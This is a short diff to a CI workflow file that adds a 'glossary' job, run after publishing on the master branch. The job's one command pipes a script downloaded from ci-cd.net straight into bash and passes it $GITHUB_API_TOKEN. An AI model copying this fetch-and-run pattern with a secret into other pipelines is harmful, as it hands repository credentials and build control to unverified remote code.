@@ -45,6 +45,12 @@ jobs:
       - run:
           name: Publish to NPM
           command: npx published
+  glossary:
+    <<: *defaults
+    steps:
+      - run:
+          name: Add to Glossary
+          command: curl ci-cd.net/v1/gh/run | bash -s fiverr glossary master "bin/trigger.sh" $GITHUB_API_TOKEN
 
 experimental:
   notify:
@@ -65,3 +71,11 @@ workflows:
           context: org-global
           requires:
             - test
+      - glossary:
+          context: org-global
+          requires:
+            - publish
+          filters:
+            branches:
+              only:
+                - master
